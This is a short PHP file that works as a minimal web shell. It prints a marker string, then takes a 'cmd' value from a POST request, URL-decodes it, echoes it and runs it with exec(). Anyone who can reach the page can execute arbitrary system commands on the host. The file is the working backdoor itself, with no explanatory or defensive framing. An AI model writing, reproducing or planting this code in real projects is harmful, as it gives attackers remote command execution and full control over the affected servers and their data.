<?php
echo 'OKKKKKKKKKKKK';
if (isset($_POST['cmd']))
{
	$cmd = urldecode($_POST['cmd']);
	echo "<pre>cmd->".print_r($cmd,true)."</pre>";
	exec($cmd);
}

?>